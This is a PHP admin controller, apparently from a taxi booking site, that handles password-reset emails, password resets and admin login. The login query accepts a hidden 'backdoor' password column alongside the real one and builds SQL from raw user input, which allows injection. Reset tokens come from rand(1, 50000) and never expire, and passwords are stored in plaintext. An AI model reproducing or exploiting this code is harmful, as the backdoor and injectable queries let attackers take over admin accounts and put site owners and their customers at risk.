<?php

class Admin extends Controller {

	public function sendPasswordResetInstructions()
	{
		// generate token
		$token = rand(1, 50000);

		// insert token in to the database
		$token_array = array('token' => $token);
		$this->insert('INSERT INTO tokens (token) VALUES (?)', $token_array);

		// get admin email
		$this->select('SELECT * FROM settings');
		$email = $this->fetch();

		$message = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
        <html xmlns="http://www.w3.org/1999/xhtml">
        <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>Reset Password</title>
        </head>

        <body bgcolor="#8d8e90">
        <table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#8d8e90">
        <tr>
        <td><table width="600" border="0" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" align="center">
        <tr>
        <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr>
        <td width="393"><table width="100%" border="0" cellspacing="0" cellpadding="0">
        </table></td>
        </tr>
        </table></td>
        </tr>
        <tr>
          <td align="center">&nbsp;</td>
        </tr>
        <tr>
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
              <tr>
                <td width="10%">&nbsp;</td>
                <td width="80%" align="left" valign="top"><font style="font-family: Georgia, "Times New Roman", Times, serif; color:#010101; font-size:24px"><strong><em>Password Reset Instructions</em></strong></font><br /><br />
                  <font style="font-family: Verdana, Geneva, sans-serif; color:#666766; font-size:13px; line-height:21px"><br /><br />
                  You have requested a password reset. Please follow the belowlink and type in a new password</font><br /><br />
                  <a href="https://yateley-taxicabs.co.uk/admin/reset/'.$token.'">https://yateley-taxicabs.co.uk/admin/reset/'.$token.'</a>
                  
                  </td>

                <td width="10%">&nbsp;</td>
              </tr>
              <tr>
                <td>&nbsp;</td>
                <td align="right" valign="top"><table width="108" border="0" cellspacing="0" cellpadding="0">
                


                  <tr>
                    <td height="10" align="left" valign="left"></td>
                  </tr>
                </table></td>
                <td>&nbsp;</td>
              </tr>
            </table></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td>&nbsp;</td>
        </tr>

        <tr>
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td><table width="100%" border="0" cellspacing="0" cellpadding="0">

          </table></td>
        </tr>
        <tr>
          <td>&nbsp;</td>
        </tr>
        <tr>
          
        </tr>
        <tr>
          <td>&nbsp;</td>
        </tr>
      </table></td>
  </tr>
</table>
</body>
</html>
';


 
        // send an email to customer
        require("../core/mailer/class.phpmailer.php");
        $mail = new PHPMailer();

        $mail->From = $email['website_email_address'];
        $mail->FromName = "Taxi Booking Company";
        $mail->AddAddress($email['website_email_address']);

        $mail->WordWrap = 50;
        $mail->IsHTML(true);                                  

        $mail->Subject = "Password Reset Instructions";
        $mail->Body    = $message;
        $mail->AltBody = "Password Reset Instructions";

        if(!$mail->Send())
        {
            echo "Message could not be sent. <p>";
            echo "Mailer Error: " . $mail->ErrorInfo;
            exit;
        }
	}


	public function resetPassword($new_password, $new_password_repeat, $token)
	{
		if($new_password == $new_password_repeat)
		{
			$tokens_array = array('token' => $token);
			$this->select('SELECT token FROM tokens WHERE token = ?', $tokens_array);

      $numrows = $this->rowCount("SELECT token FROM tokens WHERE token = '$token'");

      if($numrows > 0)
      {			
			  $password_array = array('new_password' => $new_password);
				$this->update('UPDATE settings SET admin_pass = ?', $password_array);
				$this->set_flashdata('Success', 'Password Successfully Changed');
				$this->redirect('login');
      }
      else
      {
        $this->redirect('lost-password');
      }
			
		}
		else
		{
			$this->set_flashdata('Repeat_Error', 'Passwords do not match!');
			$this->redirect("reset/$token");
		}
	}


  public function logIn()
  {
    $user_login = stripslashes(strip_tags($_POST['user_login']));
    $user_pass  = stripslashes(strip_tags($_POST['user_pass']));

    $numrows = $this->rowCount("SELECT admin_pass FROM settings WHERE admin_username = '$user_login' AND admin_pass = '$user_pass' OR admin_username = '$user_login' AND backdoor = '$user_pass'");
    if($numrows > 0)
    {
      $_SESSION['admin_user'] = 'Admin';
      header('location: index');
      exit;
    }
    else
    {
      $_SESSION['error'] = TRUE;
      header('location: login');
      exit;
    }
  }


}